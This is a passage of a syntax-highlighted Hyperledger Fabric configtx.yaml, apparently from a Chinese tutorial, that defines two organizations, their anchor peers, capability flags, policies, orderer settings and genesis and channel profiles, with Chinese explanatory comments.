'org_goMSP.peer', 'org_goMSP.client')"</span>        <span class="token comment" spellcheck="true">#    Writers:</span>        <span class="token comment" spellcheck="true">#        Type: Signature</span>        <span class="token comment" spellcheck="true">#        Rule: "OR('org_goMSP.admin', 'org_goMSP.client')"</span>        <span class="token comment" spellcheck="true">#    Admins:</span>         <span class="token comment" spellcheck="true">#       Type: Signature</span>         <span class="token comment" spellcheck="true">#       Rule: "OR('org_goMSP.admin')"</span>        <span class="token comment" spellcheck="true"># leave this flag set to true.</span>        <span class="token comment" spellcheck="true">#锚节点，</span>        <span class="token key atrule">AnchorPeers</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># AnchorPeers defines the location of peers which can be used</span>            <span class="token comment" spellcheck="true"># for cross org gossip communication.  Note, this value is only</span>            <span class="token comment" spellcheck="true"># encoded in the genesis block in the Application section context</span>            <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> peer0.orggo.haozai.com   <span class="token comment" spellcheck="true">#找到该组织的一个peer节点的域名</span>              <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7051  </span><span class="token comment" spellcheck="true">#固定端口，不用改</span>    <span class="token punctuation">-</span> <span class="token important">&amp;org_cpp</span>        <span class="token comment" spellcheck="true"># DefaultOrg defines the organization which is used in the sampleconfig</span>        <span class="token comment" spellcheck="true"># of the fabric.git development environment</span>        <span class="token key atrule">Name</span><span class="token punctuation">:</span> OrgCppMSP        <span class="token comment" spellcheck="true"># ID to load the MSP definition as</span>        <span class="token key atrule">ID</span><span class="token punctuation">:</span> OrgCppMSP        <span class="token key atrule">MSPDir</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/peerOrganizations/orgcpp.haozai.com/msp        <span class="token comment" spellcheck="true"># Policies defines the set of policies at this level of the config tree</span>        <span class="token comment" spellcheck="true"># For organization policies, their canonical path is usually</span>        <span class="token comment" spellcheck="true">#   /Channel/&lt;Application|Orderer>/&lt;OrgName>/&lt;PolicyName></span>        <span class="token comment" spellcheck="true">#背书策略</span>       <span class="token comment" spellcheck="true"># Policies:</span>       <span class="token comment" spellcheck="true">#     Readers:</span>        <span class="token comment" spellcheck="true">#        Type: Signature</span>      <span class="token comment" spellcheck="true">#          Rule: "OR('org_cppMSP.admin', 'org_cppMSP.peer', 'org_cppMSP.client')"</span>      <span class="token comment" spellcheck="true">#      Writers:</span>      <span class="token comment" spellcheck="true">#          Type: Signature</span>      <span class="token comment" spellcheck="true">#          Rule: "OR('org_cppMSP.admin', 'org_cppMSP.client')"</span>      <span class="token comment" spellcheck="true">#      Admins:</span>       <span class="token comment" spellcheck="true">#         Type: Signature</span>        <span class="token comment" spellcheck="true">#        Rule: "OR('org_cppMSP.admin')"</span>        <span class="token key atrule">AnchorPeers</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># AnchorPeers defines the location of peers which can be used</span>            <span class="token comment" spellcheck="true"># for cross org gossip communication.  Note, this value is only</span>            <span class="token comment" spellcheck="true"># encoded in the genesis block in the Application section context</span>            <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> peer0.orgcpp.haozai.com              <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">9051 </span><span class="token comment" spellcheck="true"># 固定端口，不修改</span> <span class="token comment" spellcheck="true">#zai fabric1.1之前没有 ， 设置的时候全部设置未true</span><span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Channel capabilities apply to both the orderers and the peers and must be</span>    <span class="token comment" spellcheck="true"># supported by both.</span>    <span class="token comment" spellcheck="true"># Set the value of the capability to true to require it.</span>    <span class="token key atrule">Channel</span><span class="token punctuation">:</span> <span class="token important">&amp;ChannelCapabilities</span>               <span class="token key atrule">V1_4_3</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token comment" spellcheck="true"># V1.3 for Channel enables the new non-backwards compatible</span>        <span class="token comment" spellcheck="true"># features and fixes of fabric v1.3</span>        <span class="token key atrule">V1_3</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token comment" spellcheck="true"># V1.1 for Channel enables the new non-backwards compatible</span>        <span class="token comment" spellcheck="true"># features and fixes of fabric v1.1</span>        <span class="token key atrule">V1_1</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token comment" spellcheck="true"># Orderer capabilities apply only to the orderers, and may be safely</span>    <span class="token comment" spellcheck="true"># used with prior release peers.</span>    <span class="token comment" spellcheck="true"># Set the value of the capability to true to require it.</span>    <span class="token key atrule">Orderer</span><span class="token punctuation">:</span> <span class="token important">&amp;OrdererCapabilities</span>        <span class="token comment" spellcheck="true"># V1.4.2 for Orderer is a catchall flag for behavior which has been</span>        <span class="token comment" spellcheck="true"># determined to be desired for all orderers running at the v1.4.2</span>        <span class="token comment" spellcheck="true"># level, but which would be incompatible with orderers from prior releases.</span>        <span class="token comment" spellcheck="true"># Prior to enabling V1.4.2 orderer capabilities, ensure that all</span>        <span class="token comment" spellcheck="true"># orderers on a channel are at v1.4.2 or later.</span>        <span class="token key atrule">V1_4_2</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token comment" spellcheck="true"># V1.1 for Orderer enables the new non-backwards compatible</span>        <span class="token comment" spellcheck="true"># features and fixes of fabric v1.1</span>        <span class="token key atrule">V1_1</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token comment" spellcheck="true"># Application capabilities apply only to the peer network, and may be safely</span>    <span class="token comment" spellcheck="true"># used with prior release orderers.</span>    <span class="token comment" spellcheck="true"># Set the value of the capability to true to require it.</span>        <span class="token comment" spellcheck="true">#默认配置</span>    <span class="token key atrule">Application</span><span class="token punctuation">:</span> <span class="token important">&amp;ApplicationCapabilities</span>        <span class="token comment" spellcheck="true"># V1.4.2 for Application enables the new non-backwards compatible</span>        <span class="token comment" spellcheck="true"># features and fixes of fabric v1.4.2.</span>        <span class="token key atrule">V1_4_2</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token comment" spellcheck="true"># V1.3 for Application enables the new non-backwards compatible</span>        <span class="token comment" spellcheck="true"># features and fixes of fabric v1.3.</span>        <span class="token key atrule">V1_3</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>        <span class="token comment" spellcheck="true"># V1.2 for Application enables the new non-backwards compatible</span>        <span class="token comment" spellcheck="true"># features and fixes of fabric v1.2 (note, this need not be set if</span>        <span class="token comment" spellcheck="true"># later version capabilities are set)</span>        <span class="token key atrule">V1_2</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>        <span class="token comment" spellcheck="true"># V1.1 for Application enables the new non-backwards compatible</span>        <span class="token comment" spellcheck="true"># features and fixes of fabric v1.1 (note, this need not be set if</span>        <span class="token comment" spellcheck="true"># later version capabilities are set).</span>        <span class="token key atrule">V1_1</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   SECTION: Application</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   - This section defines the values to encode into a config transaction or</span><span class="token comment" spellcheck="true">#   genesis block for application related parameters</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token key atrule">Application</span><span class="token punctuation">:</span> <span class="token important">&amp;ApplicationDefaults</span>    <span class="token comment" spellcheck="true"># Organizations is the list of orgs which are defined as participants on</span>    <span class="token comment" spellcheck="true"># the application side of the network</span>    <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Policies defines the set of policies at this level of the config tree</span>    <span class="token comment" spellcheck="true"># For Application policies, their canonical path is</span>    <span class="token comment" spellcheck="true">#   /Channel/Application/&lt;PolicyName></span>    <span class="token key atrule">Policies</span><span class="token punctuation">:</span>        <span class="token key atrule">Readers</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"ANY Readers"</span>        <span class="token key atrule">Writers</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"ANY Writers"</span>        <span class="token key atrule">Admins</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"MAJORITY Admins"</span>    <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ApplicationCapabilities</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   SECTION: Orderer</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   - This section defines the values to encode into a config transaction or</span><span class="token comment" spellcheck="true">#   genesis block for orderer related parameters</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token key atrule">Orderer</span><span class="token punctuation">:</span> <span class="token important">&amp;OrdererDefaults</span>    <span class="token comment" spellcheck="true"># Orderer Type: The orderer implementation to start</span>    <span class="token comment" spellcheck="true"># Available types are "solo","kafka"  and "etcdraft"</span>    <span class="token key atrule">OrdererType</span><span class="token punctuation">:</span> solo   <span class="token comment" spellcheck="true">#排序算法 （共识机制） Kafkar中order节点需要集群</span>    <span class="token key atrule">Addresses</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#orerder节点的地址 ， 7050端口（不要改）</span>        <span class="token punctuation">-</span> orderer.haozai.com<span class="token punctuation">:</span><span class="token number">7050</span>    <span class="token comment" spellcheck="true"># Batch Timeout: The amount of time to wait before creating a batch</span>    <span class="token key atrule">BatchTimeout</span><span class="token punctuation">:</span> 2s  <span class="token comment" spellcheck="true"># 多久产生一个区块 ，2s一个区块</span>    <span class="token comment" spellcheck="true"># Batch Size: Controls the number of messages batched into a block</span>    <span class="token key atrule">BatchSize</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># Max Message Count: The maximum number of messages to permit in a batch</span>        <span class="token key atrule">MaxMessageCount</span><span class="token punctuation">:</span> <span class="token number">100  </span><span class="token comment" spellcheck="true">#交易的最大条数 ，10条交易产生一个区块</span>        <span class="token comment" spellcheck="true"># Absolute Max Bytes: The absolute maximum number of bytes allowed for</span>        <span class="token comment" spellcheck="true"># the serialized messages in a batch.</span>        <span class="token key atrule">AbsoluteMaxBytes</span><span class="token punctuation">:</span> 64 MB  <span class="token comment" spellcheck="true">#交易大小达到99MB，产生一个区块</span>        <span class="token comment" spellcheck="true"># Preferred Max Bytes: The preferred maximum number of bytes allowed for</span>        <span class="token comment" spellcheck="true"># the serialized messages in a batch. A message larger than the preferred</span>        <span class="token comment" spellcheck="true"># max bytes will result in a batch larger than preferred max bytes.</span>        <span class="token key atrule">PreferredMaxBytes</span><span class="token punctuation">:</span> 512 KB <span class="token comment" spellcheck="true">#交易的数值 ，（不需要修改）</span>    <span class="token key atrule">Kafka</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># Brokers: A list of Kafka brokers to which the orderer connects</span>        <span class="token comment" spellcheck="true"># NOTE: Use IP:port notation</span>        <span class="token key atrule">Brokers</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#代理人，Kafka的服务器</span>            <span class="token punctuation">-</span> 127.0.0.1<span class="token punctuation">:</span><span class="token number">9092</span>    <span class="token comment" spellcheck="true"># EtcdRaft defines configuration which must be set when the "etcdraft"</span>    <span class="token comment" spellcheck="true"># orderertype is chosen.</span>    <span class="token key atrule">EtcdRaft</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># The set of Raft replicas for this network. For the etcd/raft-based</span>        <span class="token comment" spellcheck="true"># implementation, we expect every replica to also be an OSN. Therefore,</span>        <span class="token comment" spellcheck="true"># a subset of the host:port items enumerated in this list should be</span>        <span class="token comment" spellcheck="true"># replicated under the Orderer.Addresses key above.</span>        <span class="token key atrule">Consenters</span><span class="token punctuation">:</span>            <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer.example.com              <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>              <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer.example.com/tls/server.crt              <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer.example.com/tls/server.crt            <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer2.example.com              <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>              <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt              <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt            <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer3.example.com              <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>              <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer3.example.com/tls/server.crt              <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer3.example.com/tls/server.crt            <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer4.example.com              <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>              <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer4.example.com/tls/server.crt              <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer4.example.com/tls/server.crt            <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer5.example.com              <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>              <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer5.example.com/tls/server.crt              <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer5.example.com/tls/server.crt    <span class="token comment" spellcheck="true"># Organizations is the list of orgs which are defined as participants on</span>    <span class="token comment" spellcheck="true"># the orderer side of the network</span>    <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Policies defines the set of policies at this level of the config tree</span>    <span class="token comment" spellcheck="true"># For Orderer policies, their canonical path is</span>    <span class="token comment" spellcheck="true">#   /Channel/Orderer/&lt;PolicyName></span>    <span class="token key atrule">Policies</span><span class="token punctuation">:</span>        <span class="token key atrule">Readers</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"ANY Readers"</span>        <span class="token key atrule">Writers</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"ANY Writers"</span>        <span class="token key atrule">Admins</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"MAJORITY Admins"</span>        <span class="token comment" spellcheck="true"># BlockValidation specifies what signatures must be included in the block</span>        <span class="token comment" spellcheck="true"># from the orderer for the peer to validate it.</span>        <span class="token key atrule">BlockValidation</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"ANY Writers"</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   CHANNEL</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   This section defines the values to encode into a config transaction or</span><span class="token comment" spellcheck="true">#   genesis block for channel related parameters.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token key atrule">Channel</span><span class="token punctuation">:</span> <span class="token important">&amp;ChannelDefaults</span>    <span class="token comment" spellcheck="true"># Policies defines the set of policies at this level of the config tree</span>    <span class="token comment" spellcheck="true"># For Channel policies, their canonical path is</span>    <span class="token comment" spellcheck="true">#   /Channel/&lt;PolicyName></span>    <span class="token key atrule">Policies</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># Who may invoke the 'Deliver' API</span>        <span class="token key atrule">Readers</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"ANY Readers"</span>        <span class="token comment" spellcheck="true"># Who may invoke the 'Broadcast' API</span>        <span class="token key atrule">Writers</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"ANY Writers"</span>        <span class="token comment" spellcheck="true"># By default, who may modify elements at this config level</span>        <span class="token key atrule">Admins</span><span class="token punctuation">:</span>            <span class="token key atrule">Type</span><span class="token punctuation">:</span> ImplicitMeta            <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"MAJORITY Admins"</span>    <span class="token comment" spellcheck="true"># Capabilities describes the channel level capabilities, see the</span>    <span class="token comment" spellcheck="true"># dedicated Capabilities section elsewhere in this file for a full</span>    <span class="token comment" spellcheck="true"># description</span>    <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ChannelCapabilities</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   Profile</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   - Different configuration profiles may be encoded here to be specified</span><span class="token comment" spellcheck="true">#   as parameters to the configtxgen tool</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token key atrule">Profiles</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#不修改 </span>        <span class="token comment" spellcheck="true">#区块的名字</span>    <span class="token key atrule">HaozaiOrgsOrdererGenesis</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#区块名字，随便改</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ChannelDefaults</span>         <span class="token key atrule">Orderer</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererDefaults</span>            <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token important">*OrdererOrg</span>            <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>                <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererCapabilities</span>        <span class="token key atrule">Consortiums</span><span class="token punctuation">:</span>            <span class="token key atrule">SampleConsortium</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#可以改 TEST1</span>                <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>                    <span class="token punctuation">-</span> <span class="token important">*org_go</span>                    <span class="token punctuation">-</span> <span class="token important">*org_cpp</span>         <span class="token comment" spellcheck="true"># 通道的名字</span>    <span class="token key atrule">HaozaiOrgsChannel</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#通道名字，可以改</span>        <span class="token key atrule">Consortium</span><span class="token punctuation">:</span> SampleConsortium  <span class="token comment" spellcheck="true">#要和TEST1对应</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ChannelDefaults</span>        <span class="token key atrule">Application</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ApplicationDefaults</span>            <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token important">*org_go</span>  <span class="token comment" spellcheck="true">#属于这个通道</span>                <span class="token punctuation">-</span> <span class="token important">*org_cpp</span>  <span class="token comment" spellcheck="true">#属于当前的通道</span>            <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>                <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ApplicationCapabilities</span>    <span class="token key atrule">SampleDevModeKafka</span><span class="token punctuation">:</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ChannelDefaults</span>        <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ChannelCapabilities</span>        <span class="token key atrule">Orderer</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererDefaults</span>            <span class="token key atrule">OrdererType</span><span class="token punctuation">:</span> kafka            <span class="token key atrule">Kafka</span><span class="token punctuation">:</span>                <span class="token key atrule">Brokers</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> kafka.example.com<span class="token punctuation">:</span><span class="token number">9092</span>            <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>            <span class="token punctuation">-</span> <span class="token important">*OrdererOrg</span>            <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>                <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererCapabilities</span>        <span class="token key atrule">Application</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ApplicationDefaults</span>            <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>            <span class="token punctuation">-</span> <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererOrg</span>        <span class="token key atrule">Consortiums</span><span class="token punctuation">:</span>            <span class="token key atrule">SampleConsortium</span><span class="token punctuation">:</span>                <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token important">*org_go</span>                <span class="token punctuation">-</span> <span class="token important">*org_cpp</span>    <span class="token key atrule">SampleMultiNodeEtcdRaft</span><span class="token punctuation">:</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ChannelDefaults</span>        <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ChannelCapabilities</span>        <span class="token key atrule">Orderer</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererDefaults</span>            <span class="token key atrule">OrdererType</span><span class="token punctuation">:</span> etcdraft            <span class="token key atrule">EtcdRaft</span><span class="token punctuation">:</span>                <span class="token key atrule">Consenters</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer.example.com                  <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>                  <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer.example.com/tls/server.crt                  <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer.example.com/tls/server.crt                <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer2.example.com                  <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>                  <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt                  <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt                <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer3.example.com                  <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>                  <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer3.example.com/tls/server.crt                  <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer3.example.com/tls/server.crt                <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer4.example.com                  <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>                  <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer4.example.com/tls/server.crt                  <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer4.example.com/tls/server.crt                <span class="token punctuation">-</span> <span class="token key atrule">Host</span><span class="token punctuation">:</span> orderer5.example.com                  <span class="token key atrule">Port</span><span class="token punctuation">:</span> <span class="token number">7050</span>                  <span class="token key atrule">ClientTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer5.example.com/tls/server.crt                  <span class="token key atrule">ServerTLSCert</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/example.com/orderers/orderer5.example.com/tls/server.crt            <span class="token key atrule">Addresses</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> orderer.example.com<span class="token punctuation">:</span><span class="token number">7050</span>                <span class="token punctuation">-</span> orderer2.example.com<span class="token punctuation">:</span><span class="token number">7050</span>                <span class="token punctuation">-</span> orderer3.example.com<span class="token punctuation">:</span><span class="token number">7050</span>                <span class="token punctuation">-</span> orderer4.example.com<span class="token punctuation">:</span><span class="token number">7050</span>                <span class="token punctuation">-</span> orderer5.example.com<span class="token punctuation">:</span><span class="token number">7050</span>            <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>            <span class="token punctuation">-</span> <span class="token important">*OrdererOrg</span>            <span class="token key atrule">Capabilities</span><span class="token punctuation">:</span>                <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererCapabilities</span>        <span class="token key atrule">Application</span><span class="token punctuation">:</span>            <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*ApplicationDefaults</span>            <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>            <span class="token punctuation">-</span> <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*OrdererOrg</span>        <span class="token key atrule">Consortiums</span><span class="token punctuation">:</span>            <span class="token key atrule">SampleConsortium</span><span class="token punctuation">:</span>                <span class="token key atrule">Organizations</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token important">*org_go</span>                <span class="token punctuation">-</span> <span class="token important">*org_cpp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></s